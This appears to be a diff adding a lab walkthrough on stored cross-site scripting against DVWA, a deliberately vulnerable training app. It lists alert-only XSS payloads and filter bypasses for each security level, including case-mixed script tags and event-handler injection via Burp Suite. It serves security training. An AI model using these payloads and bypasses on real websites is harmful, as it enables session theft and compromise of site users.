@@ -1,0 +1,42 @@
+HOW CAN YOU HACK DVWA USING STORED-XSS? :
+
+================LOW LEVEL================
+All xss scripts work at this lvl because the web-site has no validation or filter.
+
+Example XSS-payloads:
+1. <script>alert('Stored XSS')</script>
+2. <img src=x onerror=alert('Stored XSS')>
+3. <iframe src="javascript:alert('Stored XSS')"></iframe> 
+=========================================
+
+===============MEDIUM LEVEL==============
+Here we have the filter in "$message_input", it looks like this:
+	$message = strip_tags( addslashes( $message ) ); 
+	$message = htmlspecialchars( $message );
+
+What we can do?:
+Message input sanitaze, but name filter only "<script>", doesn't detect <ScRipT>...
+
+We will use a BURP SUITE for inject XSS-payload, because name input has restriction on the lenght of input data.
+!*There is a guide on how to use Burp Suite on the Internet, so I will just explain how to carry out the attack.*!
+
+In Request we have raw like:
+	txtName=hexthunder>&mtxMessage=HackDVWA&btnSign=Sign+Guestbook
+	
+We must insert one of the payloads into the name field:
+1. <img src=1 onerror='alert("Stored XSS")'>
+2. <div onmouseover="alert('HEXTHUNDER')">Hover me</div>
+3. <input value="" onfocus="alert('Stored XSS')">
+4. <sCrIpt>alert('Stored+XSSSSS')</scRipT>
+=========================================
+
+================HIGH LEVEL===============
+What has changed?
+Just added $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
+
+And we can insert these payloads again:
+1. <img src=1 onerror='alert("Stored XSS")'>
+2. <div onmouseover="alert('HEXTHUNDER')">Hover me</div>
+3. <input value="" onfocus="alert('Stored XSS')">
+
+=========================================
